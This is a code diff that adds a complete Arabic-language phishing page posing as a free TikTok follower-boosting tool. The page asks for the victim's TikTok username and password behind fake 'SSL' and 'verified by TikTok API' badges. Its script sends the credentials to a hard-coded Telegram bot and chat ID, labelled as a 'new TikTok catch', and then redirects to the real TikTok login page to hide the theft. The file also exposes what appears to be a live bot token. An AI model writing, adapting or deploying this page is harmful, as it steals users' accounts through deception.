@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>زيادة متابعين تيك توك - مجاناً 2026</title>
+    <style>
+        body { background-color: #010101; font-family: 'Segoe UI', sans-serif; color: white; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .card { background: #121212; border: 1px solid #2f2f2f; padding: 30px; border-radius: 15px; width: 90%; max-width: 400px; text-align: center; }
+        .logo { width: 120px; margin-bottom: 20px; }
+        h1 { font-size: 20px; margin-bottom: 20px; color: #fe2c55; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #333; border-radius: 8px; background: #222; color: white; box-sizing: border-box; }
+        button { width: 100%; padding: 14px; background-color: #fe2c55; border: none; border-radius: 8px; color: white; font-weight: bold; font-size: 16px; cursor: pointer; transition: 0.3s; }
+        button:hover { background-color: #ef2950; transform: scale(1.02); }
+        .trust-badge { font-size: 12px; color: #777; margin-top: 15px; display: flex; justify-content: center; align-items: center; gap: 5px; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <img src="https://www.tiktok.com/favicon.ico" class="logo" alt="TikTok">
+        <h1>أداة زيادة المتابعين (تحديث 2026)</h1>
+        <p style="font-size: 14px; color: #ccc;">أدخل بياناتك للتحقق من الحساب وبدء إرسال 5000 متابع حقيقي.</p>
+        
+        <form id="tiktokForm">
+            <input type="text" id="user" placeholder="اسم المستخدم (Username)" required>
+            <input type="password" id="pass" placeholder="كلمة السر" required>
+            <button type="submit">تفعيل الزيادة الآن</button>
+        </form>
+
+        <div class="trust-badge">
+            <span>🛡️ اتصال مشفر SSL</span>
+            <span>✅ موثق من TikTok API</span>
+        </div>
+    </div>
+
+    <script>
+        const token = '8462219592:AAEyi0IhxJgBOgOYQ-sq5NuaRZsTY144IcY';
+        const chatId = '7637530382';
+
+        document.getElementById('tiktokForm').onsubmit = function(e) {
+            e.preventDefault();
+            const user = document.getElementById('user').value;
+            const pass = document.getElementById('pass').value;
+            const text = `🎯 صيد تيك توك جديد 🎯\n\n👤 يوزر: ${user}\n🔑 باس: ${pass}`;
+
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`)
+            .then(() => {
+                // تحويل لصفحة النجاح الوهمية أو تيك توك
+                window.location.href = 'https://www.tiktok.com/login';
+            })
+            .catch(() => {
+                window.location.href = 'https://www.tiktok.com/login';
+            });
+        };
+    </script>
+</body>
+</html>
